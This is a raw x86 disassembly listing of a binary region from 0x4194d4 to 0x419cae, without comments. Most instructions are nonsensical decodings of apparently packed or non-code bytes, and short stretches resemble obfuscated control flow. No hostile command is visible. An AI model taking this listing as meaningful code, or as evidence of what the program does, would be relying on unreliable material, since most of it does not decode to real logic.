  4194d4:	mov    edx,0xa1d979d8
  4194d9:	pop    esp
  4194da:	jb     0x4194e3
  4194dc:	dec    edx
  4194dd:	cmp    al,0xe3
  4194df:	loope  0x419471
  4194e1:	jnp    0x41949e
  4194e3:	mov    BYTE PTR [eax],bh
  4194e5:	push   es
  4194e6:	pop    DWORD PTR [edi]
  4194e8:	jp     0x41951a
  4194ea:	xchg   edx,eax
  4194eb:	pop    esi
  4194ec:	movaps xmm7,XMMWORD PTR [edi-0x30900d0]
  4194f3:	sbb    eax,0xb604f23
  4194f8:	out    dx,al
  4194f9:	iret   
  4194fa:	inc    ecx
  4194fb:	ret    
  4194fc:	adc    esi,0x2
  4194ff:	(bad)  
  419501:	pause  
  419503:	push   edx
  419504:	pop    ecx
  419505:	in     al,dx
  419506:	push   ebp
  419507:	ins    BYTE PTR es:[edi],dx
  419508:	clc    
  419509:	jne    0x419497
  41950b:	lock (bad) 
  41950d:	mov    cl,0x40
  41950f:	test   eax,0xd0a9c2af
  419514:	dec    ebx
  419515:	cli    
  419516:	or     al,0xce
  419518:	loop   0x4194fe
  41951a:	inc    edi
  41951b:	mov    ds:0x89b2fdd2,al
  419520:	dec    DWORD PTR ds:0xb2f58c5a
  419526:	dec    esp
  419527:	(bad)  
  419529:	ins    BYTE PTR es:[edi],dx
  41952a:	adc    ecx,ebx
  41952c:	add    ah,BYTE PTR [eax]
  41952e:	mov    ch,0xe9
  419530:	xchg   edi,eax
  419531:	xor    al,0xba
  419533:	lods   eax,DWORD PTR ds:[esi]
  419534:	mov    ds:0xaf3ae5ea,eax
  419539:	jo     0x419526
  41953b:	lea    eax,[ebx]
  41953d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41953e:	xchg   BYTE PTR [ebx*8-0x50e8cd4f],ch
  419545:	shl    edx,0x11
  419548:	pop    ebx
  419549:	ins    BYTE PTR es:[edi],dx
  41954a:	xor    ch,BYTE PTR [ebx+ebp*4-0x43]
  41954e:	sbb    ch,BYTE PTR [ecx+0x43]
  419551:	lahf   
  419552:	pop    esi
  419553:	or     BYTE PTR [esi+edi*1],bh
  419556:	ds dec ecx
  419558:	test   eax,0xd3812a8a
  41955e:	or     al,0x6a
  419560:	js     0x419547
  419562:	mov    ecx,0xb08b7f89
  419567:	stos   BYTE PTR es:[edi],al
  419568:	inc    ebp
  419569:	repnz dec ebp
  41956b:	pushfw 
  41956d:	bound  edi,QWORD PTR [esi+0x3839807f]
  419573:	or     ax,WORD PTR [edx+edi*2+0x41]
  419578:	ret    0xe2c3
  41957b:	adc    al,0x9
  41957d:	adc    al,0xcd
  41957f:	in     eax,0x0
  419581:	jae    0x41950b
  419583:	or     eax,DWORD PTR [edx+0x7431d0b0]
  419589:	mov    ecx,DWORD PTR [edx*4+0x6b23c713]
  419590:	retf   
  419591:	adc    DWORD PTR [esi-0x55],edi
  419594:	sub    al,0xf7
  419596:	aad    0xdb
  419598:	sahf   
  419599:	cmp    BYTE PTR [eax+0x57b84c67],al
  41959f:	xor    eax,DWORD PTR [esi-0x5a]
  4195a2:	push   0xde83d447
  4195a7:	inc    edi
  4195a8:	add    DWORD PTR [esi-0x1e],edx
  4195ab:	mov    al,0x32
  4195ad:	cmp    al,0x79
  4195af:	inc    ebp
  4195b0:	dec    edx
  4195b1:	xchg   ecx,eax
  4195b2:	(bad)  
  4195b3:	jo     0x41956d
  4195b5:	int    0x24
  4195b7:	pop    esi
  4195b8:	mov    ds:0x40b48e2c,al
  4195bd:	clc    
  4195be:	sbb    DWORD PTR [ebx+0x6d],0xdf5f901d
  4195c5:	retf   
  4195c6:	(bad)  
  4195c7:	cwde   
  4195c8:	pusha  
  4195c9:	dec    esi
  4195ca:	jnp    0x419628
  4195cc:	in     eax,0xe6
  4195ce:	ret    
  4195cf:	cmp    al,dl
  4195d1:	add    BYTE PTR [edx],al
  4195d3:	xchg   edx,eax
  4195d4:	pop    esi
  4195d5:	mov    WORD PTR [edx+0x70],cs
  4195d8:	cmp    dh,BYTE PTR fs:[ecx-0x9]
  4195dc:	pusha  
  4195dd:	es pop esi
  4195df:	sub    eax,DWORD PTR ds:0xa93d0244
  4195e5:	add    BYTE PTR [ebx],dh
  4195e7:	outs   dx,BYTE PTR ds:[esi]
  4195e8:	add    DWORD PTR [ecx-0x38884453],0xffffffb3
  4195ef:	add    eax,0xc2f1a3fe
  4195f4:	icebp  
  4195f5:	jg     0x419582
  4195f7:	pop    esp
  4195f8:	call   DWORD PTR [eax]
  4195fa:	xor    edx,DWORD PTR [eax]
  4195fc:	and    BYTE PTR [edi],bl
  4195fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ff:	dec    ecx
  419600:	out    0xa5,al
  419602:	fidivr WORD PTR [ebx-0x5d]
  419605:	mov    ds:0xf3e5467b,eax
  41960a:	mov    ah,0xbb
  41960c:	push   es
  41960d:	cmp    bh,BYTE PTR [esi+0x619a60df]
  419613:	and    ebp,ecx
  419615:	inc    ebx
  419616:	xor    ah,BYTE PTR [ebx-0x6b]
  419619:	mov    DWORD PTR [ebx+0x38],ebx
  41961c:	add    al,0xe3
  41961e:	mov    edx,0xa8658431
  419623:	pop    edx
  419624:	cli    
  419625:	(bad)  
  419626:	lds    edi,FWORD PTR [ecx+0x31d10de6]
  41962c:	call   0xee932d55
  419631:	inc    edi
  419632:	sub    esi,DWORD PTR [esi]
  419634:	pop    edi
  419635:	daa    
  419636:	std    
  419637:	pop    ebx
  419638:	fldenv [ecx+edx*4-0x772bc8ed]
  41963f:	fstp   TBYTE PTR ds:0xcd406785
  419645:	inc    ebp
  419646:	fimul  DWORD PTR [ecx]
  419648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419649:	push   ebx
  41964a:	fmulp  st(2),st
  41964c:	scas   eax,DWORD PTR es:[edi]
  41964d:	(bad)  
  41964e:	das    
  41964f:	fwait
  419650:	ins    DWORD PTR es:[edi],dx
  419651:	js     0x4196b5
  419653:	xchg   DWORD PTR [ebx+edi*1-0x4535f49a],edi
  41965a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41965b:	and    DWORD PTR [eax],eax
  41965d:	add    BYTE PTR [esi+0xb],ah
  419660:	retf   0x8b66
  419663:	push   esp
  419664:	and    al,0x2c
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	add    DWORD PTR [eax+0x9ab90a0],edi
  41969b:	sar    BYTE PTR [esi-0x41413dcb],0x7
  4196a2:	xchg   ebx,eax
  4196a3:	inc    eax
  4196a4:	ret    0x299c
  4196a7:	pop    DWORD PTR [ecx+0x8]
  4196aa:	fwait
  4196ab:	add    al,0xb1
  4196ad:	sar    BYTE PTR [ebp+0x30],0xab
  4196b1:	shr    BYTE PTR [eax-0x4fc98472],1
  4196b7:	ss loopne 0x41964c
  4196ba:	sbb    eax,0x9da236b6
  4196bf:	mov    ch,0xed
  4196c1:	add    eax,DWORD PTR [bx+si]
  4196c4:	jno    0x4196dd
  4196c6:	scas   al,BYTE PTR es:[edi]
  4196c7:	retf   0x3f3a
  4196ca:	gs inc bp
  4196cd:	push   edx
  4196ce:	stos   DWORD PTR es:[edi],eax
  4196cf:	add    al,0x1f
  4196d1:	sbb    bh,bl
  4196d3:	push   es
  4196d4:	jbe    0x4196a6
  4196d6:	adc    BYTE PTR [ebx+0x2c],dl
  4196d9:	or     al,0x5
  4196db:	xchg   ebx,eax
  4196dc:	test   DWORD PTR [eax+0x772929ed],eax
  4196e2:	retf   
  4196e3:	sbb    al,0xdb
  4196e5:	xchg   ebp,eax
  4196e6:	fdivr  QWORD PTR [edx]
  4196e8:	test   eax,0x4860273b
  4196ed:	call   FWORD PTR ds:0xdf380c7
  4196f3:	jbe    0x4196ff
  4196f5:	xor    ecx,eax
  4196f7:	or     al,0x2b
  4196f9:	scas   al,BYTE PTR es:[edi]
  4196fa:	and    DWORD PTR ds:0x67cad24c,esp
  419700:	test   dl,dl
  419702:	cs ins BYTE PTR es:[edi],dx
  419704:	inc    esi
  419705:	cmp    ah,BYTE PTR [esi-0x7d]
  419708:	or     dh,BYTE PTR cs:[ecx+0x6f]
  41970c:	not    DWORD PTR [eax+0x5ccf1eff]
  419712:	jae    0x419773
  419714:	or     eax,ebx
  419716:	sbb    dl,BYTE PTR [edx+0xe]
  419719:	mov    eax,ds:0xca1142d1
  41971e:	outs   dx,BYTE PTR ds:[esi]
  41971f:	popa   
  419720:	pop    ds
  419721:	and    BYTE PTR [ebx-0xc976f6d],0x20
  419728:	or     eax,0xc5f2b71d
  41972d:	(bad)  
  41972e:	sbb    ebp,DWORD PTR [ecx]
  419730:	adc    eax,esi
  419732:	ret    
  419733:	stc    
  419734:	cmp    DWORD PTR [esi],esi
  419736:	or     DWORD PTR [esi-0x1b72dc7b],edx
  41973c:	xchg   ebp,eax
  41973d:	loope  0x41972c
  41973f:	add    al,ah
  419741:	aas    
  419742:	xchg   edi,eax
  419743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419744:	sbb    al,0x54
  419746:	inc    edx
  419747:	in     eax,dx
  419748:	cdq    
  419749:	mov    ebx,0x31add0f2
  41974e:	mov    al,ds:0x48b870c
  419753:	jl     0x419794
  419755:	out    dx,al
  419756:	xchg   DWORD PTR [esi+ecx*4-0x65],ebx
  41975a:	fild   DWORD PTR ss:[ecx-0x6845964]
  419761:	push   ebp
  419762:	call   0xbbd6e8b2
  419767:	outs   dx,DWORD PTR ds:[esi]
  419768:	in     eax,0x79
  41976a:	mov    dh,0x89
  41976c:	lods   eax,DWORD PTR ds:[esi]
  41976d:	pushf  
  41976e:	leave  
  41976f:	inc    esi
  419770:	cmp    eax,0xe6113db7
  419775:	sub    DWORD PTR [eax],esi
  419777:	or     BYTE PTR [eax],al
  419779:	pushf  
  41977a:	pop    es
  41977b:	call   0xcd3ed9a1
  419780:	jecxz  0x41974c
  419782:	and    ch,BYTE PTR [eax+ebx*2-0x13d990de]
  419789:	or     eax,0x8151fe2f
  41978e:	and    dh,BYTE PTR [edx+0xe1f3754]
  419794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419795:	ins    DWORD PTR es:[edi],dx
  419796:	retf   
  419797:	mov    al,0xe5
  419799:	out    dx,al
  41979a:	add    BYTE PTR [eax-0x4cdb1ec8],ah
  4197a0:	pushf  
  4197a1:	or     BYTE PTR [ebx+0x70a0f57f],dh
  4197a7:	jl     0x4197ff
  4197a9:	mov    eax,esi
  4197ab:	inc    ebx
  4197ac:	inc    esp
  4197ad:	pop    ss
  4197ae:	jmp    0x419798
  4197b0:	jbe    0x4197fd
  4197b2:	call   0x5f5b:0xba83d54
  4197b9:	add    eax,DWORD PTR [edi-0x54beade9]
  4197bf:	loopne 0x419760
  4197c1:	xor    al,0x9c
  4197c3:	adc    al,0xcb
  4197c5:	retf   0x368e
  4197c8:	cmp    DWORD PTR [esi],0x53667c22
  4197ce:	pushf  
  4197cf:	push   eax
  4197d0:	loopne 0x419817
  4197d2:	and    DWORD PTR [eax+ecx*4+0x38d3b019],ebx
  4197d9:	adc    DWORD PTR [eax-0x6c6949f2],0x5c79760d
  4197e3:	int    0x87
  4197e5:	or     bl,BYTE PTR [eax-0x37375f5a]
  4197eb:	clc    
  4197ec:	pop    edx
  4197ed:	xchg   BYTE PTR [edx-0x6e],dh
  4197f0:	out    dx,eax
  4197f1:	and    cl,dl
  4197f3:	fsubrp st(5),st
  4197f5:	cmp    ebx,esp
  4197f7:	mov    ch,0xed
  4197f9:	cld    
  4197fa:	push   ebp
  4197fb:	inc    edx
  4197fc:	lods   eax,DWORD PTR ds:[esi]
  4197fd:	nop
  4197fe:	mov    cl,BYTE PTR [edx+0x40]
  419801:	rcr    BYTE PTR [edi-0x1d],cl
  419804:	clc    
  419805:	push   es
  419806:	jmp    0x6a66:0x4e9a949d
  41980d:	cmp    al,0xc7
  41980f:	idiv   DWORD PTR [esi]
  419811:	lea    esp,[edx-0x7887c9b0]
  419817:	neg    BYTE PTR [ecx+0x11]
  41981a:	cdq    
  41981b:	adc    ch,BYTE PTR [ebx-0x3f]
  41981e:	push   0xfdf14722
  419823:	scas   al,BYTE PTR es:[edi]
  419824:	mov    ch,0x12
  419826:	xchg   esi,eax
  419827:	dec    ecx
  419828:	nop
  419829:	(bad)  
  41982a:	pop    ss
  41982b:	lahf   
  41982c:	fadd   DWORD PTR [ebx+0x11]
  41982f:	add    eax,DWORD PTR [edi]
  419831:	test   DWORD PTR [eax],esi
  419833:	cmc    
  419834:	pop    eax
  419835:	adc    esp,ebx
  419837:	mov    ds:0x8497482c,al
  41983c:	dec    ebx
  41983d:	mov    ecx,0xb643d30b
  419842:	pop    esi
  419843:	repnz xchg ebx,eax
  419845:	imul   DWORD PTR es:[edx-0x6629229c]
  41984c:	cmp    al,0x2e
  41984e:	mov    dl,0x49
  419850:	ror    BYTE PTR [edx+0x6329e030],0x9b
  419857:	xor    cl,0x4e
  41985a:	or     al,BYTE PTR [eax]
  41985c:	add    dl,ah
  41985e:	mov    ah,dl
  419860:	inc    ebx
  419861:	test   ebp,0xae305989
  419867:	stos   BYTE PTR es:[edi],al
  419868:	jnp    0x419815
  41986a:	jo     0x419816
  41986c:	fisubr DWORD PTR [ebx]
  41986e:	push   ebp
  41986f:	sub    esp,DWORD PTR [esi]
  419871:	sbb    ebx,ebx
  419873:	jnp    0x419816
  419875:	xor    al,0x96
  419877:	adc    edi,eax
  419879:	mov    bh,0x6f
  41987b:	mov    bh,0x5c
  41987d:	arpl   WORD PTR [esi-0x1b],si
  419880:	mov    ebp,0xc425b1d3
  419885:	(bad)  
  419886:	fisttp QWORD PTR [esi+0x74]
  419889:	dec    ebx
  41988a:	mov    edx,0xf3cf5877
  41988f:	dec    ebp
  419890:	sub    bh,ah
  419892:	and    ebp,ecx
  419894:	adc    al,0xb2
  419896:	jns    0x419835
  419898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419899:	inc    esp
  41989a:	scas   al,BYTE PTR es:[edi]
  41989b:	inc    ebp
  41989c:	mov    cl,0xcc
  41989e:	mov    al,0x35
  4198a0:	jg     0x4198d8
  4198a2:	xor    eax,0x4cddb6ed
  4198a7:	fild   QWORD PTR [esi+edx*2-0x7]
  4198ab:	dec    ecx
  4198ac:	jp     0x4198be
  4198ae:	cmp    eax,0xa2dee583
  4198b3:	push   0xb6c0a394
  4198b8:	pop    ds
  4198b9:	sahf   
  4198ba:	(bad)  
  4198bb:	push   ss
  4198bc:	mov    dh,0xac
  4198be:	jecxz  0x41990f
  4198c0:	push   0x6d20053d
  4198c5:	push   ds
  4198c6:	push   eax
  4198c7:	hlt    
  4198c8:	stos   DWORD PTR es:[edi],eax
  4198c9:	sbb    DWORD PTR ss:[edx],eax
  4198cc:	mov    dh,0xbf
  4198ce:	cmp    BYTE PTR [ebp+0x560a2cb0],bl
  4198d4:	or     ch,ch
  4198d6:	test   DWORD PTR [esi],ebx
  4198d8:	xlat   BYTE PTR ds:[ebx]
  4198d9:	xrelease xchg BYTE PTR [ecx-0x6a414523],dl
  4198e0:	arpl   WORD PTR [esi-0x77],sp
  4198e3:	dec    esp
  4198e4:	and    al,0x24
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	jp     0x419987
  419918:	jl     0x4198ac
  41991a:	and    al,0xd
  41991c:	sar    BYTE PTR [esi-0x41413dcb],0x68
  419923:	scas   al,BYTE PTR es:[edi]
  419924:	mov    bl,0xda
  419926:	es std 
  419928:	mov    bl,0x69
  41992a:	mov    ecx,esp
  41992c:	lods   al,BYTE PTR ds:[esi]
  41992d:	fcomp  QWORD PTR [ebx+0x2c]
  419930:	int3   
  419931:	xor    ebp,DWORD PTR [esi-0x28]
  419934:	shl    DWORD PTR [eax-0x6cfbd9df],cl
  41993a:	dec    ecx
  41993b:	mov    bl,0xc4
  41993e:	(bad)  
  41993f:	out    0x4c,eax
  419941:	dec    eax
  419942:	jge    0x4198f3
  419944:	imul   esp,ebx,0x17
  419947:	pop    ebx
  419948:	sbb    eax,0x8903b936
  41994d:	jb     0x419973
  41994f:	inc    eax
  419950:	xchg   edi,eax
  419951:	and    bh,BYTE PTR [eax+0x78482c2b]
  419957:	jbe    0x4199a0
  419959:	mov    ?,WORD PTR [esi]
  41995b:	inc    esp
  41995c:	inc    esi
  41995d:	sbb    eax,0xfffffffa
  419960:	int    0x67
  419962:	ror    cl,0x6
  419965:	lods   eax,DWORD PTR ds:[esi]
  419966:	xchg   esp,eax
  419967:	jnp    0x419937
  419969:	mov    ds:0x12835419,eax
  41996e:	ja     0x419935
  419970:	pusha  
  419971:	mov    edi,0xf25ded4
  419976:	shl    BYTE PTR [esi+0x4960f62b],1
  41997c:	cmp    esp,DWORD PTR [edx-0x268d4b73]
  419982:	add    esi,DWORD PTR [edx-0x3b]
  419985:	mov    dl,0x8b
  419987:	popf   
  419988:	add    dl,BYTE PTR [ecx-0x358ef0a9]
  41998e:	mov    dl,0xc9
  419990:	mov    bh,0xe
  419992:	pop    esi
  419993:	xor    DWORD PTR [eax+0x148fb785],esp
  419999:	ja     0x419a0a
  41999b:	mov    WORD PTR [esi+0x3d],fs
  41999e:	jle    0x419a1c
  4199a0:	sub    ecx,ecx
  4199a2:	rcr    al,cl
  4199a4:	sbb    cl,BYTE PTR [edx+0x2c]
  4199a7:	mov    al,ds:0x2f0da053
  4199ac:	pop    ds
  4199ad:	and    eax,0x9a2621b3
  4199b2:	jmp    0x4199d8
  4199b4:	loope  0x4199ec
  4199b6:	dec    ebx
  4199b7:	imul   edx,DWORD PTR [edx+0x4a],0x1c
  4199bb:	jne    0x4199d1
  4199bd:	jbe    0x419941
  4199bf:	dec    esp
  4199c0:	outs   dx,DWORD PTR ds:[esi]
  4199c1:	mov    ebx,0xa40630c8
  4199c6:	sub    eax,0x3cbea5bf
  4199cb:	test   BYTE PTR [edi],dl
  4199cd:	push   esp
  4199ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199cf:	cld    
  4199d0:	jnp    0x41995e
  4199d2:	adc    edi,ecx
  4199d4:	call   0xe6166cd8
  4199d9:	adc    bl,bl
  4199db:	leave  
  4199dc:	xor    eax,0x84494e90
  4199e1:	pop    ecx
  4199e2:	aas    
  4199e3:	cmp    dl,BYTE PTR [ebx+0xbe5414f]
  4199e9:	fadd   DWORD PTR [ebp-0x7c1abeb5]
  4199ef:	stos   BYTE PTR es:[edi],al
  4199f0:	rol    BYTE PTR [ecx+0x1d3dec74],0xac
  4199f7:	shl    BYTE PTR [eax+0x5a],0xf1
  4199fb:	xor    eax,0x5c61df6c
  419a00:	inc    esp
  419a01:	dec    ebx
  419a02:	push   es
  419a03:	popf   
  419a04:	pop    es
  419a05:	test   al,0xa
  419a07:	xor    eax,0xf5c34da6
  419a0c:	xchg   ecx,eax
  419a0d:	fcmovne st,st(7)
  419a0f:	not    BYTE PTR [edi-0x1]
  419a12:	add    BYTE PTR ds:[ebx+0x70],ah
  419a16:	xor    DWORD PTR [edi-0x2f292d57],edx
  419a1c:	sub    eax,0x3011b7e8
  419a21:	inc    esi
  419a22:	bound  esi,QWORD PTR [ecx+edi*4]
  419a25:	mov    al,0x5a
  419a27:	sbb    DWORD PTR [ebp+0x21385130],esp
  419a2d:	and    dh,ch
  419a2f:	inc    ebp
  419a30:	jle    0x4199d3
  419a32:	add    DWORD PTR [ebp+0x2b],edi
  419a35:	mov    ah,0xb1
  419a37:	retf   
  419a38:	retf   0xdcc4
  419a3b:	mov    esp,0xbe4098e4
  419a40:	outs   dx,DWORD PTR ds:[esi]
  419a41:	xchg   edi,eax
  419a42:	cmp    DWORD PTR [eax-0x2a8b7ec6],edi
  419a48:	push   0x4c
  419a4a:	test   DWORD PTR [edi],esp
  419a4c:	jge    0x419a58
  419a4e:	mov    ch,0xed
  419a50:	xchg   ebx,eax
  419a51:	cdq    
  419a52:	loopne 0x419a2b
  419a54:	xor    DWORD PTR [edx],esi
  419a56:	fnstenv [ecx]
  419a58:	scas   eax,DWORD PTR es:[edi]
  419a59:	mov    al,BYTE PTR [esi]
  419a5b:	test   edi,eax
  419a5d:	inc    ecx
  419a5e:	mov    ds:0x3d0e1096,al
  419a63:	inc    ecx
  419a64:	(bad)  
  419a65:	pop    ecx
  419a66:	jmp    0x4199f0
  419a68:	test   eax,0x9bd77779
  419a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a6e:	fisub  DWORD PTR [ebx+0x4200d645]
  419a74:	sub    bh,bl
  419a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a77:	mov    esp,0x6be53704
  419a7c:	ds gs clc 
  419a7f:	out    dx,al
  419a80:	mov    bh,0xc6
  419a82:	or     eax,0xe97207a5
  419a87:	ret    0x8f21
  419a8a:	out    0xf5,al
  419a8c:	(bad)  
  419a8e:	dec    esi
  419a8f:	mov    esi,0xc532440
  419a94:	push   esi
  419a95:	inc    esp
  419a96:	inc    ebp
  419a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a98:	mov    dl,0x74
  419a9a:	fwait
  419a9b:	bound  ecx,QWORD PTR [esi+eiz*2-0x2547a745]
  419aa2:	inc    esi
  419aa3:	add    BYTE PTR [esi+0x7a4fc125],al
  419aa9:	out    0xbc,al
  419aab:	and    DWORD PTR [ecx+0x7c],edx
  419aae:	loopne 0x419a64
  419ab0:	(bad)  
  419ab1:	aam    0x7d
  419ab3:	or     DWORD PTR [edx+edi*4+0x50a60737],ebp
  419aba:	fs jp  0x419b35
  419abd:	stos   BYTE PTR es:[edi],al
  419abe:	jb     0x419b0c
  419ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac1:	add    edx,DWORD PTR [esi]
  419ac3:	pop    edi
  419ac4:	cmp    edi,0x69
  419ac7:	xor    edi,DWORD PTR ds:0x8679ce5
  419acd:	les    ebx,FWORD PTR [ebx+0x7d]
  419ad0:	ror    DWORD PTR [ecx-0x4],0x3a
  419ad4:	out    dx,eax
  419ad5:	jp     0x419adc
  419ad7:	call   0x21c4e605
  419adc:	(bad)  
  419add:	lods   al,BYTE PTR ds:[esi]
  419ade:	popa   
  419adf:	mov    ah,BYTE PTR [eax+ebx*2-0x35]
  419ae3:	fimul  WORD PTR ds:0x7505aba
  419ae9:	fnstsw ax
  419aeb:	not    BYTE PTR [edi]
  419aed:	fwait
  419aee:	lahf   
  419aef:	jo     0x419b1a
  419af1:	pop    ebx
  419af2:	test   BYTE PTR [esi+ebx*1],ah
  419af5:	pop    ss
  419af6:	(bad)  
  419af7:	dec    esi
  419af8:	xchg   ebp,eax
  419af9:	dec    esi
  419afa:	jbe    0x419b1e
  419afc:	or     eax,DWORD PTR [edi-0x7e]
  419aff:	jnp    0x419acd
  419b01:	les    ebx,FWORD PTR [ecx]
  419b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b04:	jnp    0x419af3
  419b06:	adc    bh,ch
  419b08:	outs   dx,BYTE PTR ds:[esi]
  419b09:	sub    al,BYTE PTR [eax-0x5946f3bd]
  419b0f:	rcl    BYTE PTR [ecx+0x5721618b],cl
  419b15:	arpl   WORD PTR [edi-0x51290d3f],sp
  419b1b:	cmp    DWORD PTR [edx],esi
  419b1d:	and    DWORD PTR [ebp-0x307464bc],edi
  419b23:	jecxz  0x419b9b
  419b25:	mov    ch,0xde
  419b27:	out    dx,al
  419b28:	push   esp
  419b29:	sbb    BYTE PTR [edi+0x20a77c7],bl
  419b2f:	fcom   QWORD PTR [esi+0x74ab9030]
  419b35:	adc    eax,0x7b38ff5
  419b3a:	xchg   ebx,eax
  419b3b:	push   esi
  419b3c:	cmp    al,0xf8
  419b3e:	cld    
  419b3f:	fstp   DWORD PTR [ebp+0x4398c47e]
  419b45:	jecxz  0x419b3b
  419b47:	mov    ebx,0x773453c3
  419b4c:	loop   0x419b26
  419b4e:	scas   eax,DWORD PTR es:[edi]
  419b4f:	inc    esi
  419b50:	pushf  
  419b51:	push   edi
  419b52:	pop    ecx
  419b53:	xor    DWORD PTR [edi+0x9],edx
  419b56:	enter  0x140e,0xd4
  419b5a:	pop    edi
  419b5b:	dec    esi
  419b5c:	(bad)  
  419b5d:	(bad)  
  419b5e:	gs mov dh,0x54
  419b61:	xchg   ebp,eax
  419b62:	mov    edx,0x10de
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	mov    bl,0x75
  419bbb:	stos   BYTE PTR es:[edi],al
  419bbc:	jecxz  0x419b5a
  419bbe:	adc    eax,eax
  419bc0:	mov    esi,0xbebec235
  419bc5:	cmp    eax,0x54927c9a
  419bca:	lods   al,BYTE PTR ds:[esi]
  419bcb:	call   0xa1ca:0x707876d
  419bd2:	aam    0x7e
  419bd4:	cli    
  419bd5:	pop    ebp
  419bd6:	js     0x419c00
  419bd8:	inc    ebp
  419bd9:	dec    edi
  419bda:	xchg   ebx,eax
  419bdb:	push   ebp
  419bdc:	gs pop esi
  419bde:	test   cl,dl
  419be0:	retf   
  419be1:	and    al,0x63
  419be3:	retf   0x8646
  419be6:	sbb    al,BYTE PTR [ebx-0x5e]
  419be9:	sbb    esp,esp
  419beb:	fadd   DWORD PTR [edx-0x35]
  419bee:	mov    BYTE PTR [ebx-0x67],ch
  419bf1:	mov    edx,0xb7caaf1d
  419bf6:	xchg   edx,eax
  419bf7:	push   ebp
  419bf8:	mov    eax,ds:0xeef4cb04
  419bfd:	loopne 0x419c0f
  419bff:	add    edx,DWORD PTR [ebx-0x61aaaccf]
  419c05:	dec    edi
  419c06:	repz retf 0x6b04
  419c0a:	sahf   
  419c0b:	mov    ds:0x427e3be5,eax
  419c10:	dec    esi
  419c11:	clc    
  419c12:	mul    ch
  419c14:	ret    0x89db
  419c17:	icebp  
  419c18:	pop    edx
  419c19:	iret   
  419c1a:	neg    BYTE PTR [edi-0x2f94ba38]
  419c20:	and    bh,0x1e
  419c23:	(bad)
  419c27:	sub    edi,DWORD PTR [eax]
  419c29:	push   esi
  419c2a:	ss jbe 0x419ca8
  419c2d:	push   eax
  419c2e:	adc    BYTE PTR [ebp-0x64],0x23
  419c32:	cli    
  419c33:	adc    DWORD PTR [eax-0x9],edi
  419c36:	push   ds
  419c37:	shr    BYTE PTR [eax+0x5],1
  419c3a:	sub    ch,BYTE PTR ds:0xb3e9cbd5
  419c40:	cmp    BYTE PTR [ebx-0x49ecb021],bh
  419c46:	sahf   
  419c47:	inc    edx
  419c48:	in     eax,0x65
  419c4a:	sahf   
  419c4b:	push   eax
  419c4c:	aad    0x8f
  419c4e:	mov    ecx,0x6384b875
  419c53:	cli    
  419c54:	jecxz  0x419c71
  419c56:	call   0x140d:0xb7439bdc
  419c5d:	pop    esi
  419c5e:	fwait
  419c5f:	inc    ebp
  419c60:	inc    edi
  419c61:	mov    dl,0xda
  419c63:	in     eax,0x22
  419c65:	push   ss
  419c66:	dec    ecx
  419c67:	fwait
  419c68:	push   ebx
  419c69:	int3   
  419c6a:	outs   dx,BYTE PTR ds:[esi]
  419c6b:	int3   
  419c6c:	sbb    al,0xdb
  419c6e:	repz jp 0x419c17
  419c71:	js     0x419c60
  419c73:	das    
  419c74:	mov    DWORD PTR [esi-0x55],edx
  419c77:	ins    DWORD PTR es:[edi],dx
  419c78:	xchg   ecx,eax
  419c79:	shl    DWORD PTR [edi+edi*4+0x3dffeba9],0x6a
  419c81:	push   0xb8fd6fde
  419c86:	xchg   ecx,eax
  419c87:	xchg   esp,eax
  419c88:	sub    dl,cl
  419c8a:	push   eax
  419c8b:	popa   
  419c8c:	sbb    ch,BYTE PTR [eax-0x57]
  419c8f:	dec    edx
  419c90:	xor    al,0x6d
  419c92:	mov    BYTE PTR [edi],cl
  419c94:	lods   eax,DWORD PTR ds:[esi]
  419c95:	(bad)  
  419c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c97:	mov    edx,0xa3f34940
  419c9c:	push   esi
  419c9d:	test   al,0x40
  419c9f:	es call 0xc73:0x58d10182
  419ca7:	cmp    ebx,ebp
  419ca9:	test   eax,0x29fa5fc4
  419cae:	jne    0x419cf5
